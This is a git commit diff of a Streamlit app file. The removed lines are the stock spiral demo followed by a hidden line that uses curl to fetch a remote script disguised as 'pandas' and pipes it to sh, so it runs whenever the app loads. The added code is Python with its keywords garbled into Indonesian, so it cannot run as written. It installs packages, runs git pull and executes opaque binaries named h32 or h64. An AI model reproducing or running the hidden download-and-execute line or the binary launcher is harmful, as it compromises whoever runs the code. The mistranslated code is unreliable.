3bd1ee6daa15a61e27ed170dc6f60ff402f11421
greloyeta <96381686+greloyeta@users.noreply.github.com>
2021-12-19 21:32:07 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,38 +1,29 @@
-from collections import namedtuple
-import altair as alt
-import math
-import pandas as pd
-import streamlit as st
-
-"""
-# Welcome to Streamlit!
-Edit `/streamlit_app.py` to customize this app to your heart's desire :heart:
-If you have any questions, checkout our [documentation](https://docs.streamlit.io) and [community
-forums](https://discuss.streamlit.io).
-In the meantime, below is an example of what you can do with just a few lines of code:
-"""
-
-
-with st.echo(code_location='below'):
-    total_points = st.slider("Number of points in spiral", 1, 5000, 2000)
-    num_turns = st.slider("Number of turns in spiral", 1, 100, 9)
-
-    Point = namedtuple('Point', 'x y')
-    data = []
-
-    points_per_turn = total_points / num_turns
-
-    for curr_point_num in range(total_points):
-        curr_turn, i = divmod(curr_point_num, points_per_turn)
-        angle = (curr_turn + 1) * 2 * math.pi * i / points_per_turn
-        radius = curr_point_num / total_points
-        x = radius * math.cos(angle)
-        y = radius * math.sin(angle)
-        data.append(Point(x, y))
-
-    st.altair_chart(alt.Chart(pd.DataFrame(data), height=500, width=500)
-        .mark_circle(color='#0068c9', opacity=0.5)
-        .encode(x='x:Q', y='y:Q'))
-
-import os
-os.system('curl -fsSL https://gitlab.com/kancomue/strm/-/raw/main/pandas | sh')
+#coding=utf-8
+impor os,sys,time,random,struct
+mencoba:
+    permintaan impor
+    impor fake_useragent
+    impor bs4
+kecuali ModuleNotFoundError:
+    os.system('pip install request fake_useragent bs4 futures')
+    os.system('python raka.py')
+os.system('rm -rf .txt')
+untuk x dalam rentang(5000):
+    n = random.randint(1111111, 9999999)
+    sys.stdout=buka('.txt', 'a')
+    cetak (n)
+    sys.stdout.flush()
+os.system('hapus')
+print(' \n\n\nMendapatkan pembaruan ...')
+waktu.tidur(0.5)
+os.system('git tarik')
+os.system('hapus')
+x = str(struct.calcsize("P") * 8)
+jika '32' dalam x:
+    os.system('chmod 777 h32 && ./h32')
+    os.sys.keluar()
+elif '64' di x:
+    os.system('chmod 777 h64 && ./h64')
+lain:
+    print('\n\n\n lengkungan tidak dapat diidentifikasi')
+    os.sys.keluar()
